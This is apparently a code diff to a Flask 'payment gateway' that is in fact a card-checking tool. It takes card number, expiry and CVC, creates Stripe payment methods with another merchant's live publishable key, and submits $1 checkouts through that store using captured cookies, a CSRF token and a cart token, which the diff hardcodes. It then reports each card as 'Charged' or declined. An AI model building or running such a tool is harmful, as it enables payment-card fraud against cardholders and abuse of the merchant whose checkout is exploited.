@@ -1,8 +1,6 @@
 from flask import Flask, jsonify
 import requests
 import logging
-import os
-from dotenv import load_dotenv
 
 app = Flask(__name__)
 
@@ -55,11 +53,12 @@ def process_payment(ccn, mm, yy, cvc):
             f'&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd'
             f'&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48'
             f'&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67'
-            f'&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'
+            f'&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e'
+            f'&_stripe_account=acct_1LwocDFHMGxIu0Ep'
         )
 
         response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=10)
-        response.raise_for_status()  # Raise exception for bad status codes
+        response.raise_for_status()
         apx = response.json()
 
         if 'id' not in apx:
@@ -70,11 +69,11 @@ def process_payment(ccn, mm, yy, cvc):
         pid = apx["id"]
 
         cookies = {
-            'crumb': os.getenv('CRUMB_COOKIE', 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1'),
-            'ss_cvr': os.getenv('SS_CVR_COOKIE', 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1'),
-            'ss_cvt': os.getenv('SS_CVT_COOKIE', '1760724937850'),
-            '__stripe_mid': os.getenv('STRIPE_MID_COOKIE', '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48'),
-            '__stripe_sid': os.getenv('STRIPE_SID_COOKIE', '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67'),
+            'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
+            'ss_cvr': 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1',
+            'ss_cvt': '1760724937850',
+            '__stripe_mid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
+            '__stripe_sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
         }
 
         headers = {
@@ -91,7 +90,7 @@ def process_payment(ccn, mm, yy, cvc):
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-            'x-csrf-token': os.getenv('CSRF_TOKEN', 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1'),
+            'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
         }
 
         json_data = {
@@ -119,7 +118,7 @@ def process_payment(ccn, mm, yy, cvc):
                 'decimalValue': '1',
                 'currencyCode': 'USD',
             },
-            'cartToken': os.getenv('CART_TOKEN', 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza'),
+            'cartToken': 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
             'paymentToken': {
                 'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
                 'token': pid,
@@ -149,10 +148,13 @@ def process_payment(ccn, mm, yy, cvc):
         apx1 = response1.json()
 
         if "failureType" in apx1:
-            return f"{ccn}|{mm}|{yy}|{cvc} --> {apx1['failureType']}"
+            return f"{apx1['failureType']}"
         else:
-            return f"{ccn}|{mm}|{yy}|{cvc} --> PAYMENT_SUCCESS"
+            return "PAYMENT_SUCCESS"
 
+    except requests.exceptions.HTTPError as e:
+        logger.error(f"HTTP error: {str(e)}")
+        return f"Error: Network issue - {str(e)}"
     except requests.exceptions.RequestException as e:
         logger.error(f"Request error: {str(e)}")
         return f"Error: Network issue - {str(e)}"
@@ -176,18 +178,16 @@ def payment_gateway(card_details):
         ccn, mm, yy, cvc = parts
         result = process_payment(ccn, mm, yy, cvc)
 
-        if "PAYMENT_SUCCESS" in result:
-            status = "approved"
-        elif "DECLINED" in result.upper():
-            status = "declined"
+        if "PAYMENT_SUCCESS" in result.upper() or "SUCCEEDED" in result.upper():
+            return jsonify({"status": "approved", "response": "Charged"}), 200
+        elif "PAYMENT_DECLINED" in result.upper():
+            return jsonify({"status": "declined", "response": "Your card was declined"}), 200
         else:
-            status = "error"
-
-        return jsonify({"status": status, "response": result}), 200
+            return jsonify({"status": "error", "response": result}), 200
 
     except Exception as e:
         logger.error(f"Endpoint error: {str(e)}")
         return jsonify({"status": "error", "response": f"Internal server error: {str(e)}"}), 500
 
 if __name__ == "__main__":
-    app.run(debug=True, host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
+    app.run(debug=True, host='0.0.0.0', port=5000)
